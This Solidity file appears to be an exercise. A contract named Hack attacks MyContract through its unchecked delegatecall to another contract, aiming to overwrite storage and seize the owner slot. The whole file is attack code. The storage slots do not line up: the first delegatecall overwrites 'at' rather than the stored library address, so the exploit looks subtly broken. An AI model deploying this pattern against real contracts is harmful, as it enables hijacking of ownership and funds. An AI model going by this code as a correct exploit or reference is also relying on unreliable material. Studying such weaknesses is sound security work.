// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  address public otherContractFirst;
  address public owner;

  MyContract public toHack;

  constructor(address _to) {
    toHack = MyContract(_to);
  }

  function attack() external {
    toHack.delCallGetData(uint256(uint160(address(this))));
    toHack.delCallGetData(0);
  }

  function getData(uint256 _timestamp) external payable {
    owner = msg.sender;
  }
}

contract MyContract {
  uint256 public at;
  address public sender;
  uint256 public amount;

  address public otherContractFirst;
  address public owner;

  constructor(address _otherContractFirst) {
    otherContractFirst = _otherContractFirst;
    // otherContractSecond = _otherContractSecond;
    owner = msg.sender;
  }

  function delCallGetData(uint256 timestamp) external payable {
    (bool successFirst, ) = otherContractFirst.delegatecall(
      abi.encodeWithSelector(AnotherContractFirst.getData.selector, timestamp)
    );
    require(successFirst, "faild otherContractFirst");
    // (bool successSecond, ) = otherContractSecond.delegatecall(
    //     abi.encodeWithSelector(AnotherContractSecond.getData.selector, timestamp)
    // );
    // require(successSecond, "faild otherContractSecond");
  }
}

// contract AnotherContractSecond {
//     uint public at;
//     address public sender;
//     uint public amount;

//     event ReceivedSecond(address sender, uint value);

//     function getData(uint timestamp) external payable {
//         at = timestamp;
//         sender = msg.sender;
//         amount = msg.value;
//         emit ReceivedSecond(msg.sender, msg.value);
//     }
// }

contract AnotherContractFirst {
  uint256 public at;
  address public sender;
  uint256 public amount;

  event Received(address sender, uint256 value);

  function getData(uint256 timestamp) external payable {
    at = timestamp;
    sender = msg.sender;
    amount = msg.value;
    emit Received(msg.sender, msg.value);
  }
}
